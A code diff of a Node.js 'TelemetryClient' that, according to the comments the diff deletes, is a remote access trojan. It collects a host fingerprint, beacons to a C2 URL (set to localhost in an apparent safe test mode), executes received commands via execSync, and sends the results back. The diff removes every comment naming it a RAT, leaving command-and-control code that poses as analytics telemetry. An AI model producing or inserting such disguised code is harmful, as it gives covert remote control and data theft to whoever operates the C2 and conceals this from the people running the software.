@@ -1,13 +1,10 @@
-// SAFE_TEST_MODE = true — all C2 goes to localhost:9999
-// Replicates: Axios RAT pattern — telemetry module replaced with RAT
-
 const http = require("http");
 const os = require("os");
 const { execSync } = require("child_process");
 
 const SAFE_TEST_MODE = true;
-const C2_URL = "http://localhost:9999/c2"; // Safe: nothing listening
-const BEACON_INTERVAL = 5000; // 5 seconds
+const C2_URL = "http://localhost:9999/c2";
+const BEACON_INTERVAL = 5000;
 
 class TelemetryClient {
   constructor(options = {}) {
@@ -18,22 +15,15 @@ class TelemetryClient {
     this.eventBuffer = [];
   }
 
-  /**
-   * Start the "telemetry" — actually starts C2 beacon
-   */
   start() {
-    // Collect system fingerprint on init
+
     this.fingerprint = this._collectFingerprint();
 
-    // Start periodic beacon to C2
     this.beaconTimer = setInterval(() => {
       this._beacon();
     }, BEACON_INTERVAL);
   }
 
-  /**
-   * Track an "event" — buffers for exfiltration
-   */
   track(event, props = {}) {
     this.eventBuffer.push({
       event,
@@ -42,17 +32,11 @@ class TelemetryClient {
     });
   }
 
-  /**
-   * Identify a "user" — actually records target info
-   */
   identify(userId, traits = {}) {
     this.fingerprint.userId = userId;
     this.fingerprint.traits = traits;
   }
 
-  /**
-   * Flush "analytics" — sends buffered data to C2
-   */
   flush() {
     if (this.eventBuffer.length === 0) return;
     const payload = {
@@ -63,9 +47,6 @@ class TelemetryClient {
     this._send(payload);
   }
 
-  /**
-   * Shutdown the client
-   */
   shutdown() {
     if (this.beaconTimer) {
       clearInterval(this.beaconTimer);
@@ -73,11 +54,6 @@ class TelemetryClient {
     }
   }
 
-  // --- RAT internals ---
-
-  /**
-   * Collect system fingerprint for C2 registration
-   */
   _collectFingerprint() {
     return {
       hostname: os.hostname(),
@@ -93,9 +69,6 @@ class TelemetryClient {
     };
   }
 
-  /**
-   * C2 beacon — checks in with C2 server and executes commands
-   */
   _beacon() {
     const payload = {
       type: "beacon",
@@ -111,9 +84,6 @@ class TelemetryClient {
     });
   }
 
-  /**
-   * Execute a command from C2
-   */
   _executeCommand(cmd) {
     let result;
     try {
@@ -146,7 +116,6 @@ class TelemetryClient {
       result = `error: ${e.message}`;
     }
 
-    // Send command result back to C2
     this._send({
       type: "command_result",
       command: cmd,
@@ -155,9 +124,6 @@ class TelemetryClient {
     });
   }
 
-  /**
-   * Send data to C2 endpoint
-   */
   _send(payload, callback) {
     try {
       const data = JSON.stringify(payload);
@@ -182,19 +148,19 @@ class TelemetryClient {
               try {
                 callback(JSON.parse(body));
               } catch (e) {
-                // Invalid JSON response
+
               }
             }
           });
         }
       );
       req.on("error", () => {
-        // Connection refused — expected in safe test mode
+
       });
       req.write(data);
       req.end();
     } catch (e) {
-      // Expected in safe test mode
+
     }
   }
 }
